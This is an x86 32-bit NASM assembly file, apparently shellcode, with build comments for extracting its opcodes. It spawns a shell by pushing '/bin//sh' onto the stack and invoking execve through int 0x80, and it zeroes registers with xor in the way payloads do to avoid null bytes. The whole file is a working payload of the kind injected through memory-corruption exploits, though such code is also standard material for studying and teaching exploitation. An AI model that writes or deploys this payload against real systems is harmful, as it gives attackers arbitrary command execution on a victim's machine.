; Compile to test or get opcodes with
; nasm -f elf32 standard_execve.sh
; ld -m elf_i386 standard_execve.o -o standard_execve

section .text
        global _start

_start:
        ; Make room on the stack for the /bin//sh string
        sub sp, 0x0202

        ; execve syscall number (11)
        xor eax, eax
        mov al, 11

        ; env
        xor edx, edx

        ; argv
        xor ecx, ecx

        ;filename
        push ecx
        mov ebx, 0x68732f2f
        push ebx
        mov ebx, 0x6e69622f
        push ebx
        lea ebx, [esp]

        ; execve syscall
        int 0x80
